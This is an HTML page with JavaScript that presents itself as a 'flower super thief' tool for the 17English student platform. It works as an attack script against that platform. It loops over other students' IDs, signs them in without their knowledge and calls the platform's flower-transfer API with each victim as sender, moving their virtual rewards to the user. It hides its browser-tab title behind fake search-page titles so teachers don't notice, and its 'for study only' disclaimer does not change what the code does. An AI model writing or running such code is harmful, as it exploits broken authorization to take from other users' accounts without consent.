<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.js"></script>
<script>
	const flowerAPI = `https://studentapi.lyced.com/student/SendFlower`;
	const lsAPI = `https://studentapi.lyced.com//student/GetClassFlowerListByStudent`;
	const signInAPI = `https://studentapi.lyced.com//student/Sign`;
	let myId, l, n;

	const _request_fail = {
		Code: 0000,
		Message: "请求失败"
	};

	function Sleep(time) {
        const start = new Date().getTime();
        while (new Date().getTime() - start < time) {}
    }

	function writeln(s, t = "p") {
		document.writeln(`<${t}>${s}</${t}>`);
	}

	function parseList(user) {
		let ret = _request_fail;
		$.ajax({
		    type: "GET",
		    url: lsAPI,
			data: {StudentId: user},
		    dataType: "json",
		    async: false,
		    success: function(dat){
		        // console.log("[parseList]", JSON.stringify(dat.Data.StudentFlowers));
		        ret = dat.Data.StudentFlowers;
		    }
		});
		return ret;
	}

	function transFlower(src, dest, cnt = 1) {
		let ret = _request_fail;
		$.ajax({
		    type: "GET",
		    url: flowerAPI,
			data: {Sender: src, Receiver: dest, FlowerCount: cnt},
		    dataType: "json",
		    async: false,
		    success: function(dat){
		        ret = dat;
		    }
		});
		return ret;
	}

	function signIn(user) {
		let ret = _request_fail;
		$.ajax({
		    type: "GET",
		    url: signInAPI,
			data: {StudentId: user},
		    dataType: "json",
		    async: false,
		    success: function(dat){
		        ret = dat;
		    }
		});
		return ret;
	}

	function monitor(n, t = 1000) {
		let k = 0;
		console.log()
		let _auto_refresh = setInterval(() => {
			if(k > n) clearInterval(_auto_refresh);
			flowerLs = parseList(myId);
			flowerLs.forEach((x) => {
			    if(x.StudentId == myId) {
			        console.log(`您的鲜花数量 --> ${x.FlowerCount}`);
			    }
			});
			++k;
		}, t);
	}

	function linerFunc() {
		// 一个神奇的一次函数 y = x + b
		document.getElementById("input_id").value = parseInt(document.getElementById("input_id").value) + 1003719;
	}

	function login() {
		// 获取输入
		myId = document.getElementById("input_id").value;
		// l = document.getElementById("input_l").value;
		// n = document.getElementById("input_n").value;
		let flowerLs = parseList(myId);
		// 生成前端
		writeln("17English 鲜花超级大盗 - 内部版本", "h2");
		writeln("任务信息", "h3");
		writeln("要想返回到起始页修改相关信息，刷新即可。");
		writeln(`你的 ID 为：${myId}`);
		writeln("班级鲜花排行榜", "h3");
		writeln(JSON.stringify(flowerLs));
		writeln("\n打开控制台查看脚本输出", "b");
		writeln("", "br");
		let $startBtn = document.createElement("button"), $backBtn = document.createElement("button");
		$startBtn.innerHTML = "创建新线程";
		$backBtn.innerHTML = "返回上一页";
		document.body.appendChild($startBtn), document.body.appendChild($backBtn);
		$startBtn.setAttribute("onclick", "start()");
		$backBtn.setAttribute("onclick", "location.reload()");
		
	}

	function start() {
		let i = 0;
		let l = Math.max(1e6, Math.min(1e7, Math.floor(Math.random() * 1e7)));
		const n = 50000;
		let _main = setInterval(() => {
		    if(i >= 9999) clearInterval(_main);
		    console.log(`正在光临用户 ${l + i}...`);
		    console.log("1. 尝试签到：", signIn(l + i));
		    console.log("2. 偷花");
		    for(let res = transFlower(l + i, myId, 1), j = 1; res.Code == '0000'; ++i, ++j) {
		        try {
		        	res = transFlower(l + i, myId, 1);
		        	if(res.Code != '0000' && res.Code != '9999') throw `returned error code ${res.Code}`;
		        	console.log(`偷了 ${j} 朵花了！`);
		    		console.log("-------------------------------------");
		        } catch(e) {
		        	Sleep(1000);
		        	console.error("错误！", e.toString());
		        }
		    }
		}, 1000);
	}

	// for(let _passwd = prompt("Password required"); _passwd != "114514"; _passwd = prompt("Retry!!"));

	// 开始页面
	writeln("17English 鲜花超级大盗 - 内部版本", "h2");
	writeln("功能介绍", "h3");
	writeln("该网页通过 17English 的 API 实现帮用户签到、偷取别的用户鲜花的功能。");
	writeln("开始使用", "h3");
	writeln("请填写下面的表单，若要查询鲜花数量请只填写“您的 ID”");
	writeln("Release Note", "h3");
	writeln("内部版本，请勿外传！严禁在学校使用！技术无罪，本脚本仅用作交流学习使用。如发生 IP 被封、账号功能被禁用等事故作者不承担一切责任！");
	writeln("修复页面卡顿的问题，并支持异步");
	writeln("本网页不会储存、记录您的账号信息，请放心使用！","b");
	writeln(`${["如何制作老师恶搞表情包", "如何玩学校电脑不被班主任发现", "班主任整天查历史记录烦死了怎么办", "玩电脑被老师发现检讨800字"][Math.floor(Math.random() * 100) % 4]} - 百度经验`, "title"); 	// 该版本禁止外传，禁止在学校使用，后果自负！！！
</script>

<br>
<br>
您的 ID：<input id="input_id" value="1194148"></input><br>
<!-- 开始 ID：<input id="input_l" value="1194119"></input><br> -->
<!-- 尝试用户数：<input id="input_n" value="100000"></input><br> -->
<button onclick="linerFunc()">神奇的一次函数</button>
<button onclick="login()">确定</button>
<br>
</html>